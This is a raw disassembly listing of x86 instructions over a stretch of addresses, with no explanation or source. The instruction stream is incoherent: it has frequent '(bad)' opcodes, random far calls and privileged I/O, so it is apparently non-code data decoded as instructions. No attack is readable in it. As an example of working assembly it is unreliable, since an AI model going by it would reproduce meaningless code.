  420685:	adc    dl,0xe1
  420688:	push   edx
  420689:	xor    esi,DWORD PTR [ecx-0x4f]
  42068c:	push   edx
  42068d:	mov    bl,0x72
  42068f:	not    BYTE PTR [ebp+0x77]
  420692:	mov    bh,0xf
  420694:	sbb    BYTE PTR [esi],ah
  420696:	fs enter 0xeb7c,0x2
  42069b:	pop    eax
  42069c:	cld    
  42069d:	test   al,0xc3
  42069f:	pusha  
  4206a0:	pushf  
  4206a1:	imul   esi,DWORD PTR [edx],0xd5d0d5cc
  4206a7:	ss jl  0x4206ec
  4206aa:	inc    esi
  4206ab:	lahf   
  4206ac:	int    0xd5
  4206ae:	add    bl,dh
  4206b0:	mov    ebp,0xb4e28243
  4206b5:	sbb    al,0x95
  4206b7:	pop    ebx
  4206b8:	mov    esp,0xf94f5cb7
  4206bd:	and    bl,dl
  4206bf:	and    dl,dl
  4206c1:	repnz sbb al,0xc7
  4206c4:	xor    dh,cl
  4206c6:	or     bl,BYTE PTR [esi-0x4d]
  4206c9:	dec    ecx
  4206ca:	outs   dx,DWORD PTR ds:[esi]
  4206cb:	cdq    
  4206cc:	jae    0x42073a
  4206ce:	outs   dx,DWORD PTR ds:[esi]
  4206cf:	pop    eax
  4206d0:	and    al,0xcf
  4206d2:	clc    
  4206d3:	and    ax,0x6505
  4206d7:	cld    
  4206d8:	push   eax
  4206d9:	bswap  eax
  4206db:	adc    ecx,eax
  4206dd:	mov    bh,0x5d
  4206df:	jae    0x420745
  4206e1:	mov    bl,0x61
  4206e3:	mov    esp,0xede31c12
  4206e8:	inc    ecx
  4206e9:	int    0x65
  4206eb:	icebp  
  4206ec:	mov    WORD PTR ds:0x1732b90f,es
  4206f2:	add    al,0x28
  4206f4:	xchg   edx,eax
  4206f5:	jmp    0x721cb4c6
  4206fa:	call   0x5966:0x29fdcaaf
  420701:	stc    
  420702:	inc    edx
  420703:	mov    eax,ds:0xbc0e78f5
  420708:	push   eax
  420709:	int3   
  42070a:	mov    eax,0xc49234
  42070f:	fwait
  420710:	aam    0xbc
  420712:	adc    ecx,DWORD PTR [ecx-0x23]
  420715:	pop    ds
  420716:	ins    BYTE PTR es:[edi],dx
  420717:	sub    al,0xf5
  420719:	hlt    
  42071a:	xchg   edx,eax
  42071b:	fistp  QWORD PTR [ecx-0x2aca7ee1]
  420721:	test   al,0x43
  420723:	jno    0x420737
  420725:	lds    ebp,FWORD PTR [edx+edi*1+0x5ad554d1]
  42072c:	mov    ch,BYTE PTR [esi-0x38]
  42072f:	repz pop esi
  420731:	inc    eax
  420732:	aaa    
  420733:	mov    ds:0x1e2fcaed,al
  420738:	pslld  mm0,QWORD PTR [ecx]
  42073b:	and    esp,edx
  42073d:	cs sahf 
  42073f:	arpl   ax,bx
  420741:	xlat   BYTE PTR ds:[ebx]
  420742:	fimul  DWORD PTR [ecx]
  420744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420745:	pop    edx
  420746:	lods   eax,DWORD PTR ds:[esi]
  420747:	inc    ebx
  420748:	fisttp QWORD PTR ss:[edi]
  42074b:	push   edi
  42074c:	pop    ds
  42074d:	test   BYTE PTR [eax-0x23],0x0
  420751:	and    bh,BYTE PTR [ebp-0x486a6064]
  420757:	ror    BYTE PTR [eax-0x5bee1d03],0xcc
  42075e:	imul   eax,edi,0x17
  420761:	mov    dl,0x5d
  420763:	xchg   edx,eax
  420764:	mov    DWORD PTR [edx-0x75],ebx
  420767:	mov    al,ds:0xc036c6fa
  42076c:	rol    BYTE PTR [esi],1
  42076e:	lods   al,BYTE PTR ds:[esi]
  42076f:	mov    ebx,edx
  420771:	mov    dh,BYTE PTR ds:0xc6cfe4dc
  420777:	push   cs
  420778:	mov    edi,0xc34c4475
  42077d:	inc    ecx
  42077e:	rol    BYTE PTR [ebp+0x3b84e4ed],0xcf
  420785:	in     eax,dx
  420786:	dec    edx
  420787:	push   esp
  420788:	and    ah,BYTE PTR [ebx+0x61583321]
  42078e:	pop    edi
  42078f:	in     al,dx
  420790:	or     edi,DWORD PTR [eax-0x3f]
  420793:	arpl   WORD PTR [edx],cx
  420795:	dec    ecx
  420796:	pushf  
  420797:	cmp    esi,ebx
  420799:	std    
  42079a:	xor    ebp,esp
  42079c:	adc    ch,dl
  42079e:	mov    ebx,0xe7ac78fd
  4207a3:	sbb    al,0xb6
  4207a5:	imul   DWORD PTR [ebp+eax*2-0x41]
  4207a9:	xchg   BYTE PTR ss:[ecx-0x7df7d950],ch
  4207b0:	adc    eax,0x77356c79
  4207b5:	xchg   edx,eax
  4207b6:	int    0xbe
  4207b8:	or     al,0xd5
  4207ba:	scas   eax,DWORD PTR es:[edi]
  4207bb:	mov    ch,0x16
  4207bd:	mov    ebx,0x4fa0eaf9
  4207c2:	add    DWORD PTR [esp+ecx*8+0x23b5c892],0xffffffa7
  4207ca:	push   ebp
  4207cb:	inc    edx
  4207cc:	add    al,BYTE PTR [ecx+0x63]
  4207cf:	add    ebp,DWORD PTR [edi+0xfda85da]
  4207d5:	in     eax,dx
  4207d6:	int3   
  4207d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207d8:	and    DWORD PTR [edx-0x16],eax
  4207db:	aam    0x67
  4207dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207de:	dec    ecx
  4207df:	clc    
  4207e0:	sub    BYTE PTR [esi-0xa],cl
  4207e3:	repnz sahf 
  4207e5:	push   0x8d0adbb
  4207ea:	jno    0x4207df
  4207ec:	jbe    0x4207c8
  4207ee:	fmul   st,st(3)
  4207f0:	xor    BYTE PTR [edx-0x15],al
  4207f3:	adc    eax,0xc7b6b803
  4207f8:	xor    al,0xf5
  4207fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207fb:	jbe    0x4207fd
  4207fd:	adc    eax,0x8769c74
  420802:	and    DWORD PTR gs:[ebp-0x625e701f],0x4a1b1c36
  42080d:	fnsave [eax+0x0]
	...
  420818:	add    BYTE PTR [eax],al
  42081a:	ja     0x420868
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx+0x4c242ffd]
  420828:	mov    esi,ss
  42082a:	add    eax,0xfd000185
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    BYTE PTR [edi+0x7a],bl
  420834:	fbstp  TBYTE PTR [edi+0x155ded8e]
  42083a:	sub    DWORD PTR [edx-0x68ef9],ecx
  420840:	dec    esi
  420841:	xchg   ecx,eax
  420842:	inc    ecx
  420843:	xchg   al,dh
  420845:	mov    bl,0x61
  420847:	dec    ecx
  420848:	out    dx,al
  420849:	mov    bl,0x4
  42084b:	push   es
  42084c:	xchg   esp,eax
  42084d:	sbb    BYTE PTR [esi],bh
  42084f:	cmp    DWORD PTR [eax+0x2d],0x5d102da
  420856:	dec    ebp
  420857:	or     eax,0x430088cf
  42085c:	mov    edi,DWORD PTR [edx+esi*2+0x36]
  420860:	and    DWORD PTR [esi],esi
  420862:	(bad)
  420865:	mov    bl,0x49
  420867:	mov    cl,0x61
  420869:	iret   
  42086a:	or     eax,0x174f99b8
  42086f:	test   al,0x3e
  420871:	cli    
  420872:	pop    edx
  420873:	pop    ss
  420874:	pop    ebx
  420875:	(bad)  
  420876:	jecxz  0x42083a
  420878:	inc    ecx
  420879:	lea    eax,[esp+ebx*2+0x546af1de]
  420880:	shr    esp,cl
  420882:	(bad)  
  420884:	iret   
  420885:	cdq    
  420886:	daa    
  420887:	bound  esi,QWORD PTR [edi]
  420889:	ror    BYTE PTR [ebx+edx*2-0xc],1
  42088d:	xchg   ebp,eax
  42088e:	mov    al,0x17
  420890:	xor    bh,BYTE PTR [ebx+0x1b]
  420893:	inc    ecx
  420894:	fnstenv [ebx+0x7106730f]
  42089a:	sub    DWORD PTR [ebx+0x7e],ebp
  42089d:	icebp  
  42089e:	push   ebx
  42089f:	call   0x78af:0xa1d772ae
  4208a6:	or     DWORD PTR [edi+0x49719fdb],esp
  4208ac:	ret    0xa4b0
  4208af:	sbb    edi,DWORD PTR [esi]
  4208b1:	adc    cl,BYTE PTR [ebx]
  4208b3:	(bad)  
  4208b4:	clc    
  4208b5:	and    eax,0xddedef3d
  4208ba:	mov    ah,BYTE PTR [ecx+0x17]
  4208bd:	fs ss pushf 
  4208c0:	call   0xf8f7:0x3b5d80f5
  4208c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208c8:	pop    es
  4208c9:	stc    
  4208ca:	mov    ah,0xce
  4208cc:	push   eax
  4208cd:	aas    
  4208ce:	ss fs xor dh,ah
  4208d2:	jbe    0x420911
  4208d4:	test   eax,0x9ba60e9c
  4208d9:	or     ebp,ecx
  4208db:	push   0xffffffe2
  4208dd:	aad    0x76
  4208df:	idiv   dh
  4208e1:	cmc    
  4208e2:	stos   DWORD PTR es:[edi],eax
  4208e3:	rcl    BYTE PTR [ebp+0x76a4d4d8],1
  4208e9:	aaa    
  4208ea:	repnz (bad) 
  4208ee:	retf   
  4208ef:	mov    ecx,0x8b11898e
  4208f4:	cmp    BYTE PTR [esp+eax*8-0x78],dh
  4208f8:	fld    DWORD PTR [eax-0xc379f80]
  4208fe:	push   DWORD PTR [esi+0x2e]
  420901:	aas    
  420902:	sub    dl,BYTE PTR [ebx-0x69]
  420905:	jle    0x4208b7
  420907:	test   eax,0x59d399aa
  42090c:	jbe    0x420938
  42090e:	call   0x3b73:0xb4493167
  420915:	(bad)  
  420916:	inc    esi
  420917:	jmp    0x8e09eadd
  42091c:	adc    eax,0xac83e212
  420921:	pop    es
  420922:	cmp    ebx,DWORD PTR [edi+0x5b]
  420925:	mov    ebx,0xbfeb163f
  42092a:	mov    ecx,0x7f8a34e1
  42092f:	mov    esi,0x32faf85b
  420934:	xchg   ebx,eax
  420935:	xor    al,BYTE PTR [esi+edi*8]
  420938:	xor    al,0x18
  42093a:	cmp    bh,al
  42093c:	add    edx,ebp
  42093e:	adc    BYTE PTR [ebx],al
  420940:	stos   DWORD PTR es:[edi],eax
  420941:	or     eax,0x1e526f6
  420946:	cmc    
  420947:	outs   dx,DWORD PTR ds:[esi]
  420948:	push   ebx
  420949:	jbe    0x4209ad
  42094b:	(bad)  
  42094c:	enter  0xe812,0xba
  420950:	mov    bh,0x8b
  420952:	adc    al,0xc6
  420954:	jnp    0x42091c
  420956:	cmp    eax,DWORD PTR [ecx-0x3f]
  420959:	dec    edx
  42095a:	cmp    DWORD PTR [ebx+ebx*4],ecx
  42095d:	dec    edx
  42095e:	pop    eax
  42095f:	sbb    al,0xf4
  420961:	int3   
  420962:	(bad)  
  420963:	cmp    esp,DWORD PTR [esi]
  420965:	inc    esp
  420966:	mov    ds:0x467243ca,al
  42096b:	xor    al,0x3
  42096d:	and    al,0xd0
  42096f:	das    
  420970:	xlat   BYTE PTR ds:[ebx]
  420971:	mov    bl,0xdf
  420973:	ss pop ebx
  420975:	mov    bl,0xfc
  420977:	(bad)  
  420978:	mov    ebx,0x76d0e97b
  42097d:	or     al,0x7a
  42097f:	adc    BYTE PTR [ebp+0x1b],0x65
  420983:	jae    0x420989
  420985:	(bad)  
  420986:	shr    BYTE PTR [eax+0x121acf95],cl
  42098c:	pop    ebx
  42098d:	xchg   ecx,eax
  42098e:	loopne 0x420991
  420990:	repnz and esp,edx
  420993:	fisttp DWORD PTR [ecx]
  420995:	data16 adc BYTE PTR [edx+edx*8-0x3e],bh
  42099a:	pop    esi
  42099b:	call   0x2fb86c6d
  4209a0:	pop    eax
  4209a1:	jae    0x420994
  4209a3:	xchg   ecx,eax
  4209a4:	js     0x42099b
  4209a6:	jns    0x4209d3
  4209a8:	dec    eax
  4209a9:	mov    edx,0xd4d895d0
  4209ae:	and    ebp,DWORD PTR [ebp-0x9a7e381]
  4209b4:	lds    esi,FWORD PTR [ecx+0x2c]
  4209b7:	mov    ds:0xd8acb4eb,eax
  4209bc:	ds xor ch,0xe2
  4209c0:	outs   dx,DWORD PTR ds:[esi]
  4209c1:	es cmp edi,ebx
  4209c4:	sub    eax,0xbbe3bb32
  4209c9:	pop    ebx
  4209ca:	(bad)  
  4209cb:	mov    esi,0x9dd8c650
  4209d0:	dec    eax
  4209d1:	outs   dx,DWORD PTR ds:[esi]
  4209d2:	cdq    
  4209d3:	jg     0x4209a8
  4209d5:	les    eax,FWORD PTR [ebx+esi*2-0x11]
  4209d9:	fld    QWORD PTR [edx]
  4209db:	pop    edi
  4209dc:	cmp    bh,BYTE PTR [edx]
  4209de:	sbb    bh,cl
  4209e0:	or     BYTE PTR [ecx+0x71],ah
  4209e3:	mov    esp,0xd3f65d37
  4209e8:	retf   
  4209e9:	mov    ebp,0xda8a9bed
  4209ee:	or     al,0xd0
  4209f0:	pop    edi
  4209f1:	nop
  4209f2:	or     al,0xba
  4209f4:	test   BYTE PTR [edx+0x7692e8f2],al
  4209fa:	dec    edi
  4209fb:	cld    
  4209fc:	int3   
  4209fd:	fcmovb st,st(5)
  4209ff:	or     eax,eax
  420a01:	(bad)  
  420a02:	out    0x70,eax
  420a04:	or     al,0x64
  420a06:	cmp    eax,DWORD PTR [edi-0x44f37c69]
  420a0c:	inc    esp
  420a0d:	repz adc ecx,eax
  420a10:	cld    
  420a11:	jb     0x420a91
  420a13:	(bad)  
  420a15:	dec    ebp
  420a16:	int3   
  420a17:	dec    edi
  420a18:	pop    bx
  420a1a:	pop    ebx
  420a1b:	push   esi
  420a1c:	shl    DWORD PTR ds:0xc0f44d18,1
  420a22:	mov    bl,0x1e
  420a24:	inc    esp
  420a25:	xchg   ecx,edx
  420a27:	pop    ds
  420a28:	bound  esi,QWORD PTR [eax-0x6e5c85e7]
  420a2e:	mov    BYTE PTR [eax],al
	...
  420a38:	add    BYTE PTR [eax],al
  420a3a:	pop    es
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x4209fc
  420a47:	mov    esi,DWORD PTR [edx+0x22]
  420a4a:	add    al,BYTE PTR [edi+0x1fd0001]
  420a50:	add    BYTE PTR [eax],al
  420a52:	loope  0x420ac5
  420a54:	sahf   
  420a55:	les    edx,FWORD PTR [ebp+0x2c]
  420a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a59:	adc    BYTE PTR [ebx],dl
  420a5b:	mov    al,0x76
  420a5d:	push   esi
  420a5e:	jae    0x420aba
  420a60:	xor    DWORD PTR [edx+0x24],0xfffffffe
  420a64:	retf   
  420a65:	push   ecx
  420a66:	xrelease mov BYTE PTR [ebx-0x3e],0xf2
  420a6b:	inc    edi
  420a6c:	cwde   
  420a6d:	cmp    al,0xa1
  420a6f:	sbb    al,bh
  420a71:	jl     0x420ad6
  420a73:	xlat   BYTE PTR ds:[ebx]
  420a74:	push   esp
  420a75:	test   eax,0xd8b55f2d
  420a7a:	lds    esp,FWORD PTR [ebp-0x13f4b85d]
  420a80:	pop    edi
  420a81:	fs out 0x93,eax
  420a84:	test   DWORD PTR [edx],ecx
  420a86:	pusha  
  420a87:	xor    eax,0x8e0a5151
  420a8c:	ret    
  420a8d:	sbb    al,0x2f
  420a8f:	push   cs
  420a90:	loope  0x420a16
  420a92:	jo     0x420a70
  420a94:	fimul  WORD PTR [esi]
  420a96:	push   eax
  420a97:	inc    ebx
  420a98:	cmp    cl,BYTE PTR [edi+0x24210e01]
  420a9e:	es jle 0x420a70
  420aa1:	hlt    
  420aa2:	or     al,0x7b
  420aa4:	adc    al,0x10
  420aa6:	sub    ah,BYTE PTR [edx]
  420aa8:	pop    ebx
  420aa9:	and    cl,BYTE PTR [ecx-0x4e9ae4c0]
  420aaf:	cwde   
  420ab0:	shr    BYTE PTR [ecx],cl
  420ab2:	jmp    0x540f:0x2a087e65
  420ab9:	xchg   ebp,eax
  420aba:	das    
  420abb:	mov    edi,0x3145f670
  420ac0:	jle    0x420ab6
  420ac2:	retf   0x90bc
  420ac5:	mov    esi,0xa45017ef
  420aca:	add    edx,edx
  420acc:	xor    dl,ah
  420ace:	cdq    
  420acf:	je     0x420afc
  420ad1:	jo     0x420b2f
  420ad3:	mov    esp,0xc657c189
  420ad8:	in     eax,0x20
  420ada:	(bad)  
  420add:	rcl    BYTE PTR [ecx-0x5de5d605],1
  420ae3:	int3   
  420ae4:	stos   DWORD PTR es:[edi],eax
  420ae5:	pop    ss
  420ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ae7:	lahf   
  420ae8:	pop    edi
  420ae9:	inc    edi
  420aea:	(bad)
  420aed:	ss push esi
  420aef:	mov    ch,0x72
  420af1:	xor    DWORD PTR [ebp-0x10],ebx
  420af4:	into   
  420af5:	(bad)
  420afa:	jg     0x420b57
  420afc:	je     0x420ab3
  420afe:	jnp    0x420a85
  420b00:	call   0x2363:0x9927d47c
  420b07:	nop
  420b08:	sahf   
  420b09:	cmp    BYTE PTR [eax-0x53babae5],bl
  420b0f:	xchg   esi,eax
  420b10:	call   0x8728:0x262296c
  420b17:	jo     0x420a9f
  420b19:	ret    
  420b1a:	add    esi,DWORD PTR [edx+0x2b]
  420b1d:	scas   eax,DWORD PTR es:[edi]
  420b1e:	dec    esi
  420b1f:	stos   BYTE PTR es:[edi],al
  420b20:	rcl    DWORD PTR [eax],cl
  420b22:	in     eax,0x3a
  420b24:	add    ah,dh
  420b26:	out    dx,al
  420b27:	data16 jo 0x420af4
  420b2a:	scas   al,BYTE PTR es:[edi]
  420b2b:	cmp    ebp,ebx
  420b2d:	sbb    al,0x3e
  420b2f:	jbe    0x420b8c
  420b31:	aad    0xfc
  420b33:	daa    
  420b34:	scas   eax,DWORD PTR es:[edi]
  420b35:	mov    ah,0x62
  420b37:	push   ebp
  420b38:	out    dx,eax
  420b39:	adc    esi,edi
  420b3b:	sbb    bh,BYTE PTR [esi-0x263bda8f]
  420b41:	cmp    bl,BYTE PTR [ecx-0x69]
  420b44:	jbe    0x420b9c
  420b46:	addr16 inc edx
  420b48:	cmp    esi,edi
  420b4a:	mov    eax,?
  420b4c:	not    BYTE PTR [edx+ebp*1+0x5b43f10b]
  420b53:	pop    ds
  420b54:	lds    edx,FWORD PTR [eax+0x6c]
  420b57:	mov    dl,dl
  420b59:	jecxz  0x420b3c
  420b5b:	out    dx,al
  420b5c:	jo     0x420b4c
  420b5e:	xchg   ebx,eax
  420b5f:	mov    ebp,DWORD PTR [ebx-0x60dca9c0]
  420b65:	fst    QWORD PTR [esi+0x4e]
  420b68:	xchg   BYTE PTR [ebp+0x14aee9b5],al
  420b6e:	test   BYTE PTR [edi-0x31],dl
  420b71:	lods   eax,DWORD PTR ds:[esi]
  420b72:	pop    ecx
  420b73:	(bad)  
  420b74:	pop    ebp
  420b75:	jno    0x420b8e
  420b77:	stc    
  420b78:	rol    esp,cl
  420b7a:	mov    ebx,0x3d72c63e
  420b7f:	push   eax
  420b80:	adc    ebp,DWORD PTR [edx+0x8]
  420b83:	adc    DWORD PTR [ecx-0x444c9eeb],0xffffff85
  420b8a:	lahf   
  420b8b:	and    BYTE PTR [ecx+0x1d],dl
  420b8e:	sub    ah,BYTE PTR [edi]
  420b90:	jae    0x420b7f
  420b92:	das    
  420b93:	loope  0x420c0d
  420b95:	jb     0x420ba6
  420b97:	jg     0x420b25
  420b99:	jae    0x420c0c
  420b9b:	dec    edi
  420b9c:	push   0xffffffb7
  420b9e:	or     dh,cl
  420ba0:	pop    ss
  420ba1:	fs sub bh,dl
  420ba4:	(bad)  
  420ba5:	scas   eax,DWORD PTR es:[edi]
  420ba6:	rol    BYTE PTR [eax+0x1789bdbf],cl
  420bac:	shl    DWORD PTR [ecx+eax*1+0x3868b660],cl
  420bb3:	mov    ds:0x17ff54ba,eax
  420bb8:	das    
  420bb9:	addr16 xchg ebp,eax
  420bbb:	adc    BYTE PTR ds:0x74eced9c,bl
  420bc1:	jl     0x420b5d
  420bc3:	and    DWORD PTR [ebx],esi
  420bc5:	jnp    0x420c41
  420bc7:	int3   
  420bc8:	pop    ebx
  420bc9:	add    DWORD PTR [ecx+ecx*4],esp
  420bcc:	ins    BYTE PTR es:[edi],dx
  420bcd:	nop
  420bce:	inc    esp
  420bcf:	aaa    
  420bd0:	adc    edx,ebp
  420bd2:	das    
  420bd3:	pushf  
  420bd4:	pop    eax
  420bd5:	icebp  
  420bd6:	inc    edi
  420bd7:	sub    edi,DWORD PTR [eax+0x11]
  420bda:	pop    ds
  420bdb:	sbb    al,0xcf
  420bdd:	outs   dx,BYTE PTR ds:[esi]
  420bde:	sub    edi,esp
  420be0:	sbb    DWORD PTR [esi],ecx
  420be2:	jne    0x420c05
  420be4:	mov    ch,BYTE PTR [edi+0x78]
  420be7:	es addr16 xchg esp,eax
  420bea:	iret   
  420beb:	aam    0x57
  420bed:	sbb    eax,DWORD PTR [ebp-0x33]
  420bf0:	pusha  
  420bf1:	or     ebx,DWORD PTR ds:0x50c9e960
  420bf7:	(bad)  
  420bf8:	pop    esi
  420bf9:	ja     0x420c17
  420bfb:	xor    bl,0xc0
  420bfe:	mov    ch,BYTE PTR [esp+eax*8-0x1b]
  420c02:	xor    ebp,eax
  420c04:	inc    eax
  420c05:	shl    dh,1
  420c07:	and    bh,BYTE PTR [esp+ebx*8]
  420c0a:	inc    eax
  420c0b:	pop    ss
  420c0c:	loope  0x420c49
  420c0e:	stos   DWORD PTR es:[edi],eax
  420c0f:	shr    BYTE PTR [esi+0x318e1046],0xc4
  420c16:	popa   
  420c17:	mov    ebx,0x197adac5
  420c1c:	call   0x22f75dac
  420c21:	popf   
  420c22:	ds repz (bad) 
  420c25:	ja     0x420ca5
  420c27:	add    eax,0x583dc2ba
  420c2c:	add    al,0x7f
  420c2e:	xchg   edi,eax
  420c2f:	das    
  420c30:	ins    DWORD PTR es:[edi],dx
  420c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c32:	xchg   edi,edi
  420c34:	xor    ebx,DWORD PTR [ecx+eiz*1-0x25]
  420c38:	or     DWORD PTR [eax-0x1],eax
  420c3b:	jae    0x420c87
  420c3d:	mov    dh,bh
  420c3f:	sbb    al,al
  420c41:	repz push ds
  420c43:	push   ecx
  420c44:	xchg   edx,eax
  420c45:	test   eax,0x822b2d73
  420c4a:	push   ebx
  420c4b:	mov    cl,0x81
  420c4d:	lahf   
  420c4e:	jmp    0x420c50
	...
  420c58:	add    BYTE PTR [eax],al
  420c5a:	push   ds
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    eax,ss
  420c67:	daa    
  420c68:	nop
  420c69:	add    bh,bh
  420c6b:	mov    BYTE PTR [ecx],al
  420c6d:	add    ch,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    bl,bh
  420c73:	out    dx,al
  420c74:	mov    bh,0x51
  420c76:	mov    ds:0xd0402a98,al
  420c7b:	neg    BYTE PTR [ebx-0x12]
  420c7e:	jecxz  0x420c73
  420c80:	out    dx,eax
  420c81:	sub    eax,0xc028ec6c
  420c86:	push   edx
  420c87:	mov    esp,esp
  420c89:	lea    esp,[esi+ebx*4-0x942b180]
  420c90:	jmp    0x4ffa:0xcaa52a37
  420c97:	cli    
  420c98:	dec    esi
  420c99:	call   0xc1c4:0xf107579b
  420ca0:	cld    
  420ca1:	xchg   ecx,eax
  420ca2:	sub    DWORD PTR [ecx-0x4f],0xaddd9d38
  420ca9:	push   DWORD PTR [esi]
  420cab:	jle    0x420c4e
  420cad:	push   edx
  420cae:	mov    WORD PTR [ecx+0x62c6401d],fs
  420cb4:	dec    esp
  420cb5:	ret    
  420cb6:	dec    ecx
  420cb7:	leavew 
  420cb9:	out    0x4a,eax
  420cbb:	neg    DWORD PTR [ecx]
  420cbd:	pop    ecx
  420cbe:	cmp    DWORD PTR [eax+0x16],ebx
  420cc1:	mov    edx,DWORD PTR [ebp-0x333680c4]
  420cc7:	cmp    al,0x12
  420cc9:	add    DWORD PTR [ebx],edx
  420ccb:	jnp    0x420c6e
  420ccd:	aaa    
  420cce:	jmp    0x27c915c
  420cd3:	ja     0x420d19
  420cd5:	add    al,cl
  420cd7:	push   edi
  420cd8:	jg     0x420cc5
  420cda:	cmp    cl,BYTE PTR [eax+edi*1-0x3b]
  420cde:	jmp    0x420d16
  420ce0:	pop    edx
  420ce1:	add    BYTE PTR [ebx+0x1e2a2b20],cl
  420ce7:	pop    es
  420ce8:	outs   dx,DWORD PTR ds:[esi]
  420ce9:	dec    ebp
  420cea:	push   0xffffff89
  420cec:	push   esi
  420ced:	sbb    eax,0xeb17c0cb
  420cf2:	fisubr DWORD PTR [ecx]
  420cf4:	xor    al,0xc9
  420cf6:	popa   
  420cf7:	retf   
  420cf8:	or     al,0x18
  420cfa:	inc    esp
  420cfb:	test   BYTE PTR [ecx-0x7],0x7f
  420cff:	inc    esp
  420d00:	mov    esp,0x3a2c0810
  420d05:	(bad)  
  420d06:	jne    0x420d5b
  420d08:	adc    bl,BYTE PTR [eax-0x557c9d6b]
  420d0e:	and    BYTE PTR [edx+0x63],dl
  420d11:	mov    ah,0x76
  420d13:	stos   DWORD PTR es:[edi],eax
  420d14:	aaa    
  420d15:	aas    
  420d16:	lods   eax,DWORD PTR ds:[esi]
  420d17:	mov    dl,0x9d
  420d19:	xchg   ebp,eax
  420d1a:	lods   al,BYTE PTR ds:[esi]
  420d1b:	imul   DWORD PTR [ebx+0x4df630a3]
  420d21:	mov    al,0xc7
  420d23:	cmp    BYTE PTR [edx+0x58],bl
  420d26:	ins    DWORD PTR es:[edi],dx
  420d27:	cdq    
  420d28:	mov    bl,0xe9
  420d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d2b:	inc    ebx
  420d2c:	mov    ch,0x70
  420d2e:	popa   
  420d2f:	lock push cs
  420d31:	ds dec esp
  420d33:	(bad)  
  420d34:	idiv   BYTE PTR [eax-0x13a389d0]
  420d3a:	jmp    0x420cc0
  420d3c:	push   cs
  420d3d:	inc    ebx
  420d3e:	stos   DWORD PTR es:[edi],eax
  420d3f:	push   0xef34d430
  420d44:	mov    ds:0xa20d97bf,al
  420d49:	xor    eax,0xb61ac9e9
  420d4e:	xchg   edx,eax
  420d4f:	stos   DWORD PTR es:[edi],eax
  420d50:	out    0x92,eax
  420d52:	pop    ebx
  420d53:	jnp    0x420d00
  420d55:	stc    
  420d56:	clc    
  420d57:	(bad)  
  420d58:	ficom  DWORD PTR [edx-0x59]
  420d5b:	jmp    0xb131:0x3db7e941
  420d62:	fild   DWORD PTR [ebx-0x49]
  420d65:	mov    al,ds:0x290f41da
  420d6a:	repz push edx
  420d6c:	cmp    DWORD PTR [ebp+0x23f93de5],esp
  420d72:	mov    ecx,ebp
  420d74:	adc    al,0xd9
  420d76:	dec    edx
  420d77:	or     esp,DWORD PTR [edi]
  420d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d7a:	xor    DWORD PTR ds:0x3eb3d484,ecx
  420d80:	add    DWORD PTR [eax],ebp
  420d82:	movsx  esp,bh
  420d85:	imul   esi,DWORD PTR [edx],0x11
  420d88:	mov    ch,BYTE PTR [edx-0x52]
  420d8b:	mov    ds:0x8b873c0e,eax
  420d90:	pop    esi
  420d91:	arpl   bx,dx
  420d93:	call   FWORD PTR [ebx-0x60]
  420d96:	outs   dx,BYTE PTR ds:[esi]
  420d97:	(bad)  
  420d98:	lea    ebp,ds:0x313dd0f3
  420d9e:	outs   dx,DWORD PTR ds:[esi]
  420d9f:	or     dl,BYTE PTR [eax-0x6d]
  420da2:	scas   eax,DWORD PTR es:[edi]
  420da3:	inc    edi
  420da4:	adc    eax,0xcb553bc5
  420da9:	stc    
  420daa:	lods   eax,DWORD PTR ds:[esi]
  420dab:	and    BYTE PTR [esi],ch
  420dad:	outs   dx,BYTE PTR ds:[esi]
  420dae:	dec    ebp
  420daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420db0:	shl    BYTE PTR [ecx],1
  420db2:	mov    ds:0x67a60322,al
  420db7:	xor    eax,0x7a2d2aa9
  420dbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dbd:	xchg   edi,eax
  420dbe:	cli    
  420dbf:	mov    edi,0x2be2d17e
  420dc4:	std    
  420dc5:	xchg   ebp,eax
  420dc6:	out    dx,eax
  420dc7:	fwait
  420dc8:	mov    ds:0x7ffeb8a6,al
  420dcd:	out    0xfa,al
  420dcf:	mov    cl,0xfb
  420dd1:	repz repnz frstor [ebp+0xb]
  420dd6:	aad    0x46
  420dd8:	retf   0xe186
  420ddb:	inc    ecx
  420ddc:	sub    al,bh
  420dde:	ins    BYTE PTR es:[edi],dx
  420ddf:	(bad)  
  420de0:	cmp    ebp,DWORD PTR [ebx]
  420de2:	pop    DWORD PTR [ecx]
  420de4:	fs jmp 0x420e5e
  420de7:	stos   DWORD PTR es:[edi],eax
  420de8:	and    al,0xef
  420dea:	mov    dl,0x2
  420dec:	sbb    BYTE PTR [eax],0x53
  420def:	mov    ebx,0xf48fbc6e
  420df4:	and    BYTE PTR [esi],bl
  420df6:	out    0xf2,al
  420df8:	cld    
  420df9:	test   al,0x77
  420dfb:	repnz nop
  420dfd:	jo     0x420e4e
  420dff:	dec    ebx
  420e00:	lock in eax,dx
  420e02:	mov    edx,DWORD PTR [edx]
  420e04:	push   ecx
  420e05:	dec    edx
  420e06:	mov    edi,DWORD PTR [edi]
  420e08:	fidivr WORD PTR [ecx-0x314be348]
  420e0e:	rcr    BYTE PTR fs:[ebx-0x3f],cl
  420e12:	int3   
  420e13:	sbb    ch,BYTE PTR [ebx-0x66]
  420e16:	cld    
  420e17:	sub    BYTE PTR [esi-0x2d76dce9],ch
